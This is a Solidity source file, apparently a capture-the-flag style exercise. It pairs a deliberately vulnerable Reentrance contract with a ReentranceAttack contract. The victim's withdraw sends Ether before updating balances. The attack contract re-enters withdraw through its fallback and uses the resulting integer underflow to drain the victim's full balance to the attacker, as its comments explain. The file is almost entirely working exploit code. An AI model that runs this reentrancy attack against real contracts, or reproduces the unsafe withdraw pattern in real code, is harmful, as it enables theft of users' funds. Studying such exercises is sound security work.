pragma solidity ^0.4.24;


contract Reentrance {

  mapping(address => uint) public balances;

  function donate(address _to) public payable {
    balances[_to] += msg.value;
  }

  function balanceOf(address _who) public view returns (uint balance) {
    return balances[_who];
  }

  function withdraw(uint _amount) public {
    if(balances[msg.sender] >= _amount) {
      if(msg.sender.call.value(_amount)()) {
        _amount;
      }
      balances[msg.sender] -= _amount;
    }
  }

  function() public payable {}
}


contract ReentranceAttack {

    Reentrance victim;

    constructor(address _victim) public payable {
        victim = Reentrance(_victim);
    }

    function() external payable {
        victim.withdraw(msg.value);
    }

    //victim is vulnerable to reentrancy attacks and overflows
    function attack() external payable {
        victim.donate.value(msg.value)(address(this));
        victim.withdraw(msg.value);

        // secondary effect of the attack is a integer underflow giving the attacker access to uint256(0 -1) tokens
        // meaning the attacker can withdraw the victim's full balance with one tx
        if (victim.balanceOf(address(this)) > 1 wei) {
            victim.withdraw(address(victim).balance);
        }

        msg.sender.transfer(address(this).balance);
    }
}
